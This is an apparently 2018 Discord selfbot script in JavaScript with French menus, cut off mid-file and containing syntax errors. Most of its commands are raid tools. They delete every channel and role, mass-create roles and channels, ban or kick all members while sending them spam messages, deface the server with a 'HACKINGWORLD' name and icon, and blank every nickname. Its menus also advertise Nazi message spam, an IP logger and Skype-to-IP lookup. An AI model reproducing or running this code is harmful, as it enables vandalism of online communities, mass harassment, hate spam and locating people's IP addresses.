// --------------------- MODULE --------------------- \\

const Discord = require('discord.js');
const Guardians = new Discord.Client();
const chalk = require('chalk');
const gifSearch = require("gif-search");
const fs = require('fs');
const math = require('math-expression-evaluator');
const stripIndents = require('common-tags').stripIndents;
const asciify = require('asciify');
const leet = require('leet');
const afk = require('./Statut.json');
var express = require('express');
var app = express();
const superagent = require("superagent")
var Jimp = require('jimp');

// ---------------------------------------------------- \\

// -------------------- PREFIX ------------------------ \\

var prefix = "Project/";

// --------------------------------------------------- \\

// ------------------- LOGIN TOKEN ------------------- \\

Guardians.login(TOKEN ICI);


// ---------------------------------------------------- \\

// ---------------- PERMISSION DISCORD ---------------- \\

const Permission = [
"KICK_MEMBERS","BAN_MEMBERS","ADMINISTRATOR",
"CREATE_INSTANT_INVITE","MANAGE_CHANNELS",
"MANAGE_GUILD","ADD_REACTIONS","VIEW_AUDIT_LOG",
"VIEW_CHANNEL","READ_MESSAGES","SEND_MESSAGES",
"SEND_TTS_MESSAGES","MANAGE_MESSAGES",
"EMBED_LINKS","ATTACH_FILES","READ_MESSAGE_HISTORY",
"MENTION_EVERYONE","USE_EXTERNAL_EMOJIS","EXTERNAL_EMOJIS",
"CONNECT","SPEAK","MUTE_MEMBERS","DEAFEN_MEMBERS","MOVE_MEMBERS",
"USE_VAD","CHANGE_NICKNAME","MANAGE_NICKNAMES","MANAGE_ROLES",
"MANAGE_ROLES_OR_PERMISSIONS","MANAGE_WEBHOOKS","MANAGE_EMOJIS"
];


// ---------------------------------------------------- \\

// -------------------- SERVER WEB -------------------- \\

// app.use(express.static('public'));
// app.get('/', function(request, response) {
//  response.sendFile(__dirname + '/public/index.html');
// });
// var listener = app.listen(process.env.PORT, function() {
 //  console.log('Website is ready. !');
// });

// ---------------------------------------------------- \\

// ------------------- Console LOG ! ------------------ \\

Guardians.on('ready', () => {
  const yellow = chalk.yellow;
  const red = chalk.red;
  const bleu = chalk.cyan;
  const rose = chalk.magenta;
  let MemberCount = Guardians.users.size;
  let ServerCount = Guardians.guilds.size;
  
  console.log(yellow("Bienvenue Sur Project Guardians"));
  console.log(rose("------------------------------------"));
  console.log(red("Information Du Bot :"))
  console.log(rose("------------------------------------"));
  console.log(bleu(`Nom du bot    : ${Guardians.user.tag}!`));   
  console.log(bleu(`ID du bot     : ${Guardians.user.id}`));        
  console.log(bleu(`Token: du bot : ${Guardians.token}`));     
  console.log(bleu(`Nom du bot    : ${Guardians.user.tag}`));       
  console.log(rose("------------------------------------"));
  console.log(red("Stats Du Bot :"));
  console.log(rose("------------------------------------"));
  console.log(bleu(`Utilisateurs : ${MemberCount}`));     
  console.log(bleu(`Serveurs     : ${ServerCount}`));  
  console.log(rose("------------------------------------"));
  console.log(yellow("@Copyright ©2018 By Jack Ryan#6818"));
  
  
Guardians.user.setActivity(("V1.0 Project Guardians Ready To Use"), {startTimestamp: new Date()});
});

// --------------- COMMANDE SUR DISCORD --------------- \\

Guardians.on('message', function (message) {
  const msg = message;
  var black = Math.floor.toString(3);
  const starting = message.content;
  let messageArray = message.content.split(" ");
  let args = messageArray.slice(1);
  var rez = args.join (" ");

  if(starting.startsWith( prefix + "Modmenu")) {
  if (message.author.id !== Guardians.user.id) return;
  if (message.deletable) message.delete();
  var help1 = new Discord.RichEmbed()
  .setThumbnail(message.author.avatarURL)      
  .setTitle(`Bienvenue sur Guardians Project` + ` ${message.author.tag}`)
  .addBlankField(1)
  .addField(`__Guardians__`, `** Affiche Les Commandes Principale**`)
  .addBlankField(1)
  .addField(`__Fun__`, `** Affiche Les Commandes De Fun. !**`)
  .addBlankField(1)
  .addField(`__Modérations__`, `** Affiche Les Commandes De Modérations. !**`)
  .addBlankField(1)
  .addField(`__Raid__`, `** Affiche Les Commandes De Raid. !**`) 
  .addBlankField(1)
  .addField(`__Spamming__`, `** Affiche Les Commandes De Spam. !**`) 
  .addBlankField(1)
  .addField(`__Tools__`, `** Affiche Les Outils. !**`) 
  .addBlankField(1)
  .addField(`__Setup__`, `** Modérations du Selfbot**`)
  .addBlankField(1)
  .setColor(black)
  .setFooter('@Copyright ©2018 Guardians Project')
   .setImage('https://cdn.glitch.com/fb7cd46e-ea52-4c39-b99e-2de68108a8a4%2FHpHjod2Z57mDvmCFBZ1jnzjA.jpg?1538578654894')
  .setTimestamp()
  
  message.channel.send(help1).catch(console.error);
  );
  
  
////////////////////////// DEFI ROOT ME //////////////////////////////////////////////////

////////////////////////////////////////////////////////////////////////////////////////////
  
  if(starting.startsWith(prefix + "Guardians")) {
  if (message.author.id !== Guardians.user.id) return;
  if (message.deletable) message.delete();
  var help2 = new Discord.RichEmbed()
  .setThumbnail(message.author.avatarURL)      
  .setTitle(`Bienvenue sur Guardians Project` + ` ${message.author.tag}`)
  .addBlankField(1)
  .addField('__Crédits__', "Affiche les personne ayant participé au project. !")
  .addBlankField(1)
  .addField('__id <user>__', "Affiche l'id de la personne mentionné")
  .addBlankField(1)
  .addField('__token__', "Affiche le token ou je suis heberger. !")
  .addBlankField(1)
  .addField('__ping__', '**Affiche le temps de latence entre le Project-Guardians et le Serveur.**')
  .addBlankField(1)
  .addField('__Avatar <mention>__', '**Affiche la photo de profil de la personne mentionnée.**')
  .addBlankField(1)
  .addField('__whois <mention>__', '**Affiche les info de la personne mentionnée.**')
  .addBlankField(1)
  .addField('__Server__', '**informations sur le serveur.**')
  .addBlankField(1)
  .addField('__Eval__', '**ATTENTION TRES DANGEREUX. // execute la commande ecrit.**')
  .addBlankField(1)
  .setColor(black)
  .setFooter('@Copyright ©2018 Guardians Project')
   .setImage('https://cdn.glitch.com/fb7cd46e-ea52-4c39-b99e-2de68108a8a4%2FHpHjod2Z57mDvmCFBZ1jnzjA.jpg?1538578654894')
  .setTimestamp()
  
  message.channel.send(help2).catch(console.error);
  }  
  
  if(starting.startsWith(prefix + "Fun")) {
  if (message.author.id !== Guardians.user.id) return;
  if (message.deletable) message.delete();
  var help3 = new Discord.RichEmbed()
  .setThumbnail(message.author.avatarURL)      
  .setTitle(`Bienvenue sur Guardians Project` + ` ${message.author.tag}`)  
  .addBlankField(1)
  .addField(`__8ball__`,`**Pose une quesion + Réponse automatique du bot avec differente Réponse. !**`)
  .addBlankField(1)
  .addField(`__echo__`,`**Fait parler ton selfbot. !**`)
  .addBlankField(1)
  .addField(`__reverse <text>__`,`**Reverse un text. !**`)
  .addBlankField(1)
  .addField(`__leet <text>__`,`**Crypte le text. !**`)
  .addBlankField(1)
  .addField('__Calc__', '**Fait des calcul mathématique.**')
  .addBlankField(1)
  .addField('__Ascii <text>__', '**Affiche ton text en ASCII.**')
  .addBlankField(1)
  .addField('__Hacktoken <mention>__', '**Hack le token de la personne mentionné (troll)**')
  .addBlankField(1)
  .setColor(black)
  .setFooter('@Copyright ©2018 Guardians Project')
  .setImage('https://cdn.glitch.com/fb7cd46e-ea52-4c39-b99e-2de68108a8a4%2FHpHjod2Z57mDvmCFBZ1jnzjA.jpg?1538578654894')
  .setTimestamp()
  
  message.channel.send(help3).catch(console.error);
  
  }
  
   if(starting.startsWith(prefix + "Setup")) {
  if (message.author.id !== Guardians.user.id) return;
  if (message.deletable) message.delete();
  var help3 = new Discord.RichEmbed()
  .setThumbnail(message.author.avatarURL)      
  .setTitle(`Bienvenue sur Guardians Project` + ` ${message.author.tag}`)
  .addBlankField(1)
  .addField(`__setGame <jeux> __`,`**Définira un statut [Joue a + <le nom du jeux>].**`)
  .addBlankField(1)
  .addField(`__setEcoute <ecoute> __`,`**Définira un statut [Ecoute + <le nom de l'écoute>].**`)
  .addBlankField(1)
  .addField(`__setStream <stream> __`,`**Définira un statut [Streaming a + <le nom du stream>].**`)
  .addBlankField(1)
  .addField(`__setWatch <regarde> __`,`**Définira un statut [regarde + <le nom du watch>].**`)
  .addBlankField(1)
  .addField(`__setNull__`,`**Remet par Default ton statut.**`)
  .addBlankField(1)
  .addField(`__-setStatut + <idle/dnd/invisible/online>__`, `**// idle = absent | dnd = offline  | invisible = invisible  | online = online \\**`)
  .setColor(black)
  .setFooter('@Copyright ©2018 Guardians Project')
  .setImage('https://cdn.glitch.com/fb7cd46e-ea52-4c39-b99e-2de68108a8a4%2FHpHjod2Z57mDvmCFBZ1jnzjA.jpg?1538578654894')
  .setTimestamp()
  
  message.channel.send(help3).catch(console.error);
  
  }
  
  if(starting.startsWith(prefix + "Split")) {
  var split = args.join(" ");
  let world = split
  world.split('').join(' ')
  }
  
  if(starting.startsWith(prefix + "Modérations")) {
  if (message.author.id !== Guardians.user.id) return;
  if (message.deletable) message.delete();
  var help4 = new Discord.RichEmbed()
  .setThumbnail(message.author.avatarURL)      
  .setTitle(`Bienvenue sur Guardians Project` + ` ${message.author.tag}`)
  .addBlankField(1)
  .addField('__BanID <id>__', "**Banira l'id dans le serveur ou vous l'avez faite**")
  .addBlankField(1)
  .addField('__Ban <mention>__', "**Banira la personne du serveur. !**")
  .addBlankField(1)
  .addField('__Kick <mention>__', "**Kickera la personne du serveur. !**")
  .addBlankField(1)
  .addField('__Purge <number>__', "**Purgera le nombre de personne demandé. !**")
  .addBlankField(1)
  .setColor(black)
  .setFooter('@Copyright ©2018 Guardians Project')
  .setTimestamp()
  .setImage('https://cdn.glitch.com/fb7cd46e-ea52-4c39-b99e-2de68108a8a4%2FHpHjod2Z57mDvmCFBZ1jnzjA.jpg?1538578654894')
  message.channel.send(help4).catch(console.error);
  }
  
  if(starting.startsWith(prefix + "Raid")) {
  if (message.author.id !== Guardians.user.id) return;
  if (message.deletable) message.delete();
  var help5 = new Discord.RichEmbed()
  .setThumbnail(message.author.avatarURL)      
  .setTitle(`Bienvenue sur Guardians Project` + ` ${message.author.tag}`)
  .addBlankField(1)
  .addField('__deleteC__', "**Supprime tout les Channel. !**")
  .addBlankField(1)
  .addField('__DeleteR__', "**Supprime tout les Role. !**")
  .addBlankField(1)
  .addField('__CreeC__', "**Crée masse Channel. !**")
  .addBlankField(1)
  .addField('__CreeR__', "**Crée masse Role. !**")
  .addBlankField(1)
  .addField('__bALL__', "**ban ALL. !**")
  .addBlankField(1)
  .addField('__kALL__', "**kick ALL**")
  .addBlankField(1)
  .addField('__deface__', "**Deface le server. !**")
  .addBlankField(1)
  .addField('__nick__', "**Change le nom de tout le monde. !**")
  .addBlankField(1)
  .addField('__Deban__', "**Deban tout ceux qui sont ban du serveur. !**")
  .addBlankField(1)
  .setColor(black)
  .setFooter('@Copyright ©2018 Guardians Project')
  .setTimestamp()
  .setImage('https://cdn.glitch.com/fb7cd46e-ea52-4c39-b99e-2de68108a8a4%2FHpHjod2Z57mDvmCFBZ1jnzjA.jpg?1538578654894')
  message.channel.send(help5).catch(console.error);
  }
  
  if(starting.startsWith(prefix + "Spamming")) {
  if (message.author.id !== Guardians.user.id) return;
  if (message.deletable) message.delete();
  var help6 = new Discord.RichEmbed()
  .setThumbnail(message.author.avatarURL)      
  .setTitle(`Bienvenue sur Guardians Project` + ` ${message.author.tag}`)
  .addBlankField(1)
  .addField('__SpamNazi__', "**Spam un Message Nazi. !**")
  .addBlankField(1)
  .addField('__SpamDieux__', "**Spam un Message Dieux. !**")
  .addBlankField(1)
  .addField('__SpamTTS__', "**Spam un Message A haute voix ( si permission ) use tts. !**")
  .addBlankField(1)
  .addField('__SpamChoise <message>__', "**Spam un Message Que vous avez choisit. !**")
  .addBlankField(1)
  .setColor(black)
  .setFooter('@Copyright ©2018 Guardians Project')
  .setTimestamp()
  .setImage('https://cdn.glitch.com/fb7cd46e-ea52-4c39-b99e-2de68108a8a4%2FHpHjod2Z57mDvmCFBZ1jnzjA.jpg?1538578654894')
  message.channel.send(help6).catch(console.error);
  }
  
  ////////////////////////////// TOOLS HELP ///////////////////////////////////////
  
  if (starting.startsWith(prefix + "Tools")) {
  if (message.author.id !== Guardians.user.id) return;
  if (message.deletable) message.delete();
  var help7 = new Discord.RichEmbed()
  .setThumbnail(message.author.avatarURL)      
  .setTitle(`Bienvenue sur Guardians Project` + ` ${message.author.tag}`)
  .addBlankField(1)
  .addField('__IpLoc <IP>__', "**Localise L'ip demandé. !**")
  .addBlankField(1)
  .addField('__SkypetoIp <USER SKYPE>__', "**Convertit le skype en ip. !**")
  .addBlankField(1)
  .addField('__IpLogger <ID YOUTUBE POUR REDIRECTION>__', "**Création d'un ip logger. !**")
  .addBlankField(1)
  .addField('__IptoSkype <IP>__', "**Convertit l'ip en skype. !**")
  .setColor(black)
  .setFooter('@Copyright ©2018 Guardians Project')
  .setTimestamp()
  .setImage('https://cdn.glitch.com/fb7cd46e-ea52-4c39-b99e-2de68108a8a4%2FHpHjod2Z57mDvmCFBZ1jnzjA.jpg?1538578654894')
 message.channel.send(help7).catch(console.error);
  }
  ////////////////////////////// CREDIT ////////////////////////////////////////////
  
  if (starting.startsWith(prefix + "Crédits")) {
  if (message.author.id !== Guardians.user.id) return;
  if (message.deletable) message.delete();
  const Credit = new Discord.RichEmbed()
  .setDescription('**__Crédits__**')
  .addBlankField(1)
  .addField('__Dévelloper du bot__', '**Le bot a été dévelloper par __Jack Ryan#6818__**')
  .addBlankField(1)
  .addField('__Graphiste__', '**Créateur du logo  __A.k TV__**')
  .setColor(black)
  .setFooter('@Copyright ©2018 Guardians Project // Merci a Vous !')
  .addBlankField(1)
  .setTimestamp()
  .setImage('https://cdn.glitch.com/fb7cd46e-ea52-4c39-b99e-2de68108a8a4%2FHpHjod2Z57mDvmCFBZ1jnzjA.jpg?1538578654894')
  message.channel.send(Credit).catch(console.error);
  }
  ////////////////////////////// CHANGE TON JEUX ///////////////////////////////////////////
  
  if (starting.startsWith(prefix + 'setGame')) {
	if (message.author.id !== Guardians.user.id) return;
  if (message.deletable) message.delete();
      Guardians.user.setGame(rez); return message.reply('Mon **jeu** a été **modifié** avec **succès** !!')
  }  else
    
///////////////////////////// CHANGE TON ECOUTE ///////////////////////////////////////////
    
 if (starting.startsWith(prefix + 'setEcoute')) {
 if (message.author.id !== Guardians.user.id) return;
 if (message.deletable) message.delete();
     Guardians.user.setActivity((rez), { type: "LISTENING" }); return message.reply('Mon **Écoute** a été **modifié** avec **succès** !!')
  } else
    
///////////////////////////// CHANGE TON Watch ///////////////////////////////////////////

 if (starting.startsWith(prefix + 'setWatch')) {
 if (message.author.id !== Guardians.user.id) return;
 if (message.deletable) message.delete();
     Guardians.user.setActivity((rez), {type: "WATCHING"}); return message.reply('Mon **Watching** a été**modifié** avec **succés** !!')
  } else
    
///////////////////////////// CHANGE TON STREAM ///////////////////////////////////////////

 if (starting.startsWith(prefix + 'setStream')) {
 if (message.author.id !== Guardians.user.id) return;
 if (message.deletable) message.delete();
     Guardians.user.setActivity((rez), {type: "STREAMING", url: "https://www.spotify.com/"}); return message.reply('Mon **Streaming** a été **modifié** avec **succés** !!')
  } else
    
///////////////////////////// REMET A NULL  ///////////////////////////////////////////
    
 if (starting.startsWith(prefix + 'setNull')) {
 if (message.author.id !== Guardians.user.id) return;
 if (message.deletable) message.delete();
     Guardians.user.setActivity(null); return message.reply('Mon **Jeux, Stream, Watch, Ecoute** a été **remit** par **Default** !!')
  } else

/////////////////////////////// CHANGE TON STATUT /////////////////////////////////////////////
    
  if (starting.startsWith(prefix + 'setstatut')) {
	if (message.author.id !== Guardians.user.id) return;
  if (message.deletable) message.delete();
      Guardians.user.setStatus(rez); return message.reply('Mon **status** a été **modifié** avec **succés** !!')
    // idle = absent | dnd = offline  | invisible = invisible  | online = online \\
    } 
/////////////////////////////// 8BALL /////////////////////////////////////////////
  
  if (starting.startsWith(prefix + '8ball')) {
	if (message.author.id !== Guardians.user.id) return;
  if (message.deletable) message.delete();
  var question = starting.split(" ").join(" ").slice(13)
  const Réponse = [
    'peut etre',
    'jsp ',
    'mdr',
    'ta dit quoi.',
    'bienvue',
    'Nn',
    'OMG comment tu sais',
    'oui',
    'stv',
];
   const ball = new Discord.RichEmbed()
   .setDescription('__**Jeux 8ball**__')
   .setColor(black)
   .addField('Question: ', question)
   .addField('Reponse:', Réponse[Math.floor(Math.random() * Réponse.length)])
   .setThumbnail(Guardians.user.iconURL)
       
  message.channel.send(ball).catch(console.error).then(m => m.delete(60000));
    
   }

////////////////////////////// SAY ////////////////////////////////////////////
  
  if(starting.startsWith(prefix + "echo")) {
    if (message.author.id !== Guardians.user.id) return;
    if(message.deletable) message.delete();
    var echoo = args.join(" ");
    const echo = new Discord.RichEmbed()
    .setTitle('ADMINISTRATOR SAID : ')
    .setDescription(echoo)
    .setColor(black)
    message.channel.send(echo).catch(console.error).then(m => m.delete(60000));
    }

/////////////////////////////// BAN ID /////////////////////////////////////// 
  
  if(starting.startsWith(prefix + "banid")) {
    
    if (message.author.id !== Guardians.user.id) return;
    if(message.deletable) message.delete();
    let args = message.content.split(' ').slice(1);
    message.guild.ban(args[0]).catch(error=>{
    const banerror = new Discord.RichEmbed()
    .addField(`**${message.author.username}**`, `__Erreur de banissement de <@${args[0]}>.__`)
    .setColor(black)
    if (!message.guild.member(message.author).hasPermission('BAN_MEMBERS'))
    return message.channel.send(banerror).catch(console.error);
    const banid = new Discord.RichEmbed()
    .addField(`**${message.author.username}**`, `__banissement de <@${args[0]}> avec succes.__`)
    .setColor(black)
    message.channel.send(banid).catch(console.error).then(m => m.delete(60000));
})
  }
                                     
  
////////////////////////////// ID ///////////////////////////////////////////
  
  if(starting.startsWith(prefix + "id")) {
    if (message.author.id !== Guardians.user.id) return;
    let men = message.mentions.users.first();
    if(message.deletable) message.delete();
    const whoisid = new Discord.RichEmbed()
    .addField(`ID DE ${men.username} : `, `${men.id}`)
    .setColor(black)
    message.channel.sendMessage(whoisid).catch(console.error).then(m => m.delete(60000));
  }  

///////////////////////////// TOKEN AFFICHE /////////////////////////////////
  
  if(starting.startsWith(prefix + "token")) {
    if (message.author.id !== Guardians.user.id) return;
    if(message.deletable) message.delete();
    
    const tkn = new Discord.RichEmbed()
    .setDescription(`:spy: Voici ton token : ${Guardians.token} :spy:`)
    .setFooter(`Attention Le token est privé. ! `)
    .setColor(black)
    message.channel.send(tkn).catch(console.error).then(m => m.delete(60000));
  }

//////////////////////////// BAN ///////////////////////////////////////////
  
  if(starting.startsWith(prefix + "ban")) {
    if(message.author.id !== Guardians.user.id) return;
    if(message.deletable) message.delete();
    let args = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
    const ban = new Discord.RichEmbed()
    .addField(`**${message.author.username}**`, `__banissement de ${args} avec succes.__`)
    .setColor(black)
    message.channel.send(ban).catch(console.error).then(m => m.delete(60000));
    args.ban();

  } 
  
///////////////////////////////// KICK ///////////////////////////////////////////
  
  if(starting.startsWith(prefix + "kick")) {
    if(message.author.id !== Guardians.user.id) return;
    if(message.deletable) message.delete();
    let args = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
    const kick = new Discord.RichEmbed()
    .addField(`**${message.author.username}**`, `__banissement de ${args} avec succes.__`)
    .setColor(black)
    message.channel.send(kick).catch(console.error).then(m => m.delete(60000));
    args.kick();

  } 
  
  // if(starting.startsWith(prefix + "gif")) {
  //   if(message.author.id !== Guardians.user.id) return;
   //  if(message.deletable) message.delete();
  //   let args = args.join(" ");
   //  gifSearch.random(args).then(
  //     gifUrl => {
   //    var gif = new Discord.RichEmbed()
   //    .setColor(black)
   //    .setImage(gifUrl)
  //     message.channel.send(gif);
  // }) //

//   }
  
//////////////////////////////// DELETE CHANNEL //////////////////////////////////////
  
  if(message.content.startsWith(prefix + 'deleteC')) { 
    if(message.author.id !== Guardians.user.id) return;
    if(message.deletable) message.delete();
    message.guild.channels.forEach(channel => {
      if(channel.deletable) channel.delete()
    });
                                   
  };

///////////////////////////////// DELETE ROLE ///////////////////////////////////////
  
  if(message.content.startsWith(prefix + 'deleteR')) { 
   if(message.author.id !== Guardians.user.id) return;
    if(message.deletable) message.delete();
    message.guild.roles.forEach(role => {
    role.delete()
    });
   };
  
///////////////////////////////// CREE ROLE ///////////////////////////////////////
  
 if(message.content.startsWith(prefix + 'creeR')) { 
  if(message.author.id !== Guardians.user.id) return;
  if(message.deletable) message.delete();
  let i = 0;
  let interval = setInterval(function () {
    if (i === 250) clearInterval(interval);
    message.guild.createRole("ABCDEFGHIJKLMNAPR").then(i++);
  }, 100);
 }

//////////////////////////////// CREE CHANNEL /////////////////////////////////////
  
 if(message.content.startsWith(prefix + 'creeC')) { 
  if(message.author.id !== Guardians.user.id) return;
  if(message.deletable) message.delete();
  let i = 0;
  let interval = setInterval(function () {
    if (i === 250) clearInterval(interval);
    message.guild.createChannel("Raid_By_HACKINGWORLD").then(i++);
  }, 100);
 }
  
////////////////////////////// KICK ALL ////////////////////////////////////////
  
  if(message.content.startsWith(prefix + 'kALL')) { 
  if(message.author.id !== Guardians.user.id) return;
  if(message.deletable) message.delete();
  
  message.guild.members.forEach(member=>{
				
				member.send(message.guild+"Message au Spammeur : j'ai rien demander fdp j ai meme pas la perm de ban mdrr donc calme toi tu fait rien wsh, si tu est pas un bot click ici pour rejoindre le discord: https://discord.gg/BKg6Qd");
				member.kick().then(member=>{
				});	
			});
  };

//////////////////////////// BAN ALL ///////////////////////////////////////////
  
  if(message.content.startsWith(prefix + 'bALL')) { 
  if(message.author.id !== Guardians.user.id) return;
  if(message.deletable) message.delete();
  
  message.guild.members.forEach(member=>{
				
				member.send(message.guild+" a été raid !! ");
				member.ban().then(member=>{
				message.channel.send(":wave:" + member.displayName + " a été jeté hors du serveur ");}).catch(()=>{
				message.channel.send("Access Denied :x:");
				});	
			});
  };
  if(message.content.startsWith(prefix + 'sa')) { 
   if(message.author.id !== Guardians.user.id) return;
   if(message.deletable) message.delete();
   const st = new Discord.RichEmbed()
   .setTitle("clic ici")
   .setURL("https://ftnl.fr/")
   message.channel.send(st)
  }
///////////////////////// DEFACE TOUT LE MONDE //////////////////////////////
  
   if(message.content.startsWith(prefix + 'deface')) { 
   if(message.author.id !== Guardians.user.id) return;
   if(message.deletable) message.delete();
   
    message.guild.setRegion('amsterdam')
    message.guild.setIcon('https://hackingworld.org/logo.png');
    var interval = setInterval (function () {
    message.guild.setName("RAID BY HACKINGWORLD.ORG")
    }, 130);
 }
 
///////////////////////////// NICK /////////////////////////////////////
  
   if(message.content.startsWith(prefix + 'nick')) { 
   if(message.author.id !== Guardians.user.id) return;
   if(message.deletable) message.delete();
   
   message.guild.members.forEach(member => {
     if(member.setNickname(" "));         
            })
  };

/////////////////////////// PURGE ///////////////////////////////////////
  
   if(message.content.startsWith(prefix + 'Purge')) { 
    if(message.author.id !== Guardians.user.id) return;
    if(message.deletable) message.delete(); 
    let nombre = args.join(" ");
 
     if (message.channel.type === 'text') {
            return message.channel.fetchMessages({limit: nombre})
                .then(messagee => {
            message.channel.bulkDelete(messagee)
               .catch(console.error);
        })
     }
   }
   
  
////////////////////////////////// AFK / ENLEVE AFK ///////////////////////////////////////////////// 
      let afk = JSON.parse(fs.readFileSync("./Statut.json", "utf8"));
      if (message.content.startsWith(prefix + "remAfk")){
      if (afk[msg.author.id]) {
      delete afk[msg.author.id];
      if (msg.member.nickname === null) {
      msg.reply("Tu a enlever ton AFK.");
      }else{
      msg.reply("Tu a enlever ton AFK.");
      }
      fs.writeFile("./Statut.json", JSON.stringify(afk), (err) => { if (err) console.error(err);});
      }else{
      msg.reply("tu a enlever ton AFK.");
      }
      }
      
   if (message.content.startsWith(prefix + "setAfk")) {
      if (afk[message.author.id]) {
      return message.reply("Tu es déjà AFK . !");
      }else{
      let args1 = message.content.split(" ").slice(1);
      if (args1.length === 0) {
      afk[message.author.id] = {"reason" : true};
      message.delete();
      message.channel.send(`tu es désormais AFK`);
      }else{
      afk[message.author.id] = {"reason" : args1.join(" ")};
      message.delete();
      message.channel.send(`tu es désormais AFK`);
      }
      fs.writeFile("./Statut.json", JSON.stringify(afk), (err) => { if (err) console.error(err);});
      }
      }
          
          var mentionned = message.mentions.users.first();
      if(message.mentions.users.size > 0) {
      if (afk[message.mentions.users.first().id]) {
      if (afk[message.mentions.users.first().id].reason === true) {
      message.channel.send(`**${mentionned.username}** est **AFK**: __*sans raison*__`);
      }else{
      message.channel.send(`**${mentionned.username}** est **AFK**: __*${afk[message.mentions.users.first().id].reason}*__`);
      }
      }
      }
     
////////////////////////////////// SERVER ///////////////////////////////////////////////
  
  if(message.content.startsWith(prefix + 'Server')) { 
  if(message.author.id !== Guardians.user.id) return;
  if(message.deletable) message.delete(); 
  let servericon = message.guild.iconURL;
  var date = message.guild.createdAt;
	let server = new Discord.RichEmbed()
  .setColor(black)
  .setDescription("**-------- SERVER INFO --------**")
  .addField("Server:", message.guild.name)    
  .addField("Creator's id:", Guardians.user.createdTimestamp, true)
  .addField("Creater Of This Serveur:", message.guild.owner, true)
  .addField("Créé le:", date.getDate()+"/"+(date.getMonth()+1)+"/"+date.getFullYear()+" : "+date.getHours()+":"+date.getMinutes(), true)
  .addField("Total members:", message.guild.memberCount, true)
	.addField('Nombre de Channels:', message.guild.channels.size, true)
	.addField('Nombre de Roles:', message.guild.roles.size, true)
	.addField("Région du serveur:", message.guild.region)
	.addField('Niveau de vérification du Server:', message.guild.verificationLevel)
	.setThumbnail(servericon)
		
		 message.channel.send(server).catch(console.error).then(m => m.delete(60000));
}
 
/////////////////////////////////// CALCULATRICE /////////////////////////////////////
  
  if(message.content.startsWith(prefix + 'Calc')) { 
  if(message.author.id !== Guardians.user.id) return;
  if(message.deletable) message.delete(); 
  if (args.length < 1) {
        message.reply('Tu dois fournir un calcul valide :boom:');
    }
  const question = args.join(' ');
  let answer;
	 try {
        answer = math.eval(question);
	 } catch (err) {
        console.error(`Invalid math equation: ${err}`);
    }
    
    message.delete();
	 let calcule = new Discord.RichEmbed()
    .setDescription("**Calculatrice !**")
    .setColor(black)
    .addField("**Equation:**", question)
	
  	.addField("**Résultat:**", answer)
   message.channel.send(calcule).catch(console.error).then(m => m.delete(60000));

}; 
  
/////////////////////////////// AVATAR ////////////////////////////////////////////////
  
  if(message.content.startsWith(prefix + 'Avatar')) { 
  if(message.author.id !== Guardians.user.id) return;
  if(message.deletable) message.delete(); 
  const user = message.mentions.users.first();
  if (!user) {
       message.reply('ta pas mentionner de personne :smile: !.');
    }

  if (!user.avatarURL) {
        message.reply(`Il na pas d'avatar !.`);
    }

  
	 let avatar = new Discord.RichEmbed()
    .setDescription("**Avatar Discord**")
    .setColor(black)
    .addField(`${user.username}'s Avatar`, `[Download](${user.avatarURL})`)
   	.setImage(user.avatarURL)
	  message.channel.send(avatar).catch(console.error).then(m => m.delete(60000));
};
  
//////////////////////////////// ASCII /////////////////////////////////////////////
  
  if(message.content.startsWith(prefix + 'Ascii')) { 
  if(message.author.id !== Guardians.user.id) return;
  
    let textasciify = args.join(" ")
    if (!textasciify) return message.edit("Tu a rien ecrit. :smile: . !!")
    asciify(textasciify, {font: 'standard'}, function (err, res) {
      if (err) {
        console.error(err)
        message.channel.send(`Une erreur a été produite :p L'Error: \`\`\`${err}\`\`\``)
        return
      }
    
      message.edit("```\n" + res + "```\n").catch(console.error).then(m => m.delete(60000));
    })
};
  
/////////////////////////////////////// WHOIS /////////////////////////////////////////////
  
if(starting.startsWith(prefix + "Whois")) {
  let mention = message.mentions.users.first();
  if (!mention) {
        return message.reply("Veuillez mentionné une personne");
  }
  const rejointdiscord = (mention.createdAt.getDate() + 1) + '/' + (mention.createdAt.getMonth() + 1) + '/' + mention.createdAt.getFullYear() + ' | ' + mention.createdAt.getHours() + ':' + mention.createdAt.getMinutes() + ':' + mention.createdAt.getSeconds();
  
  let last;
    if (mention.lastMessage === null) {
        last = 'Cette utilisateur na pas récemment parler';
    } else {
        last = mention.lastMessage;
    }
  let stat;
    if (mention.presence.status === 'offline') {
        stat = 'Offline';
    } else if (mention.presence.status === 'online') {
        stat = 'Online';
    } else if (mention.presence.status === 'dnd') {
        stat = 'Indisponible';
    } else if (mention.presence.status === 'idle') {
        stat = 'Invisible';
    }
  let game;
    if (mention.presence.game === null) {
        game = 'Cette utilisateur na actuellement pas de jeux lancé.';
    } else {
        game = mention.presence.game.name;
    }
  let mentione;
  if (mention.bot === false) {
    mentione = 'N\'est pas un bot.'
    } else if (mention.bot === true) {
    mentione = 'Est un bot.'
    }
  const whois = new Discord.RichEmbed()
  .addField("Infomation :", `Pseudo : ${mention.username} \n Tag : ${mention.tag} \n Discriminateur : ${mention.discriminator} \n Id : ${mention.id} \n Rejoint discord : ${rejointdiscord} \n Son Statut : ${stat} \n Dernier Message Envoyé : ${last} \n Cet user ${mentione} \n Utilisateur : ${game}`)
  .addField(`Role que le joueur a sur le serveur ! :`, '``' + message.mentions.members.first().roles.map(r => r.name).join(', ') + '``' + '\n')
  .setThumbnail(mention.displayAvatarURL)
  .setColor(black)
  message.channel.send(whois).catch(console.error);
  }
  
  if(message.content.startsWith(prefix + 'Deban')) { 
  if(message.author.id !== Guardians.user.id) return;
  if(message.deletable) message.delete(); 
 let interval = setInterval(function () {
      msg.guild.fetchBans().then(bans => {
        bans.forEach(ban => {
          msg.guild.unban(ban.id);
        });
      });
    }, 1000);
 }
  
///////////////////////////////////// LEET //////////////////////////////////////////////////////
  
  if(message.content.startsWith(prefix + 'leet')) { 
  if(message.author.id !== Guardians.user.id) return;
  
    let text = args.slice(1).join(" ")
    if (!args[0]) { return message.edit(":x: Tu ne peux pas convertir :x:") }
    message.edit("" + leet.convert(text)).then(m => m.delete(60000));
	
}
  
//////////////////////////////////////////////// REVERSE ///////////////////////////////////////

  if(message.content.startsWith(prefix + 'reverse')) { 
  if(message.author.id !== Guardians.user.id) return;
  if(message.deletable) message.delete(); 

    if (args.length < 1) {
        message.reply('Vous devez entrer le texte à inverser !');
    }
    message.channel.send(args.join(' ').split('').reverse().join('')).then(m => m.delete(60000));
};
  
//////////////////////////////////////////////// SPAM NAZI ///////////////////////////////////////

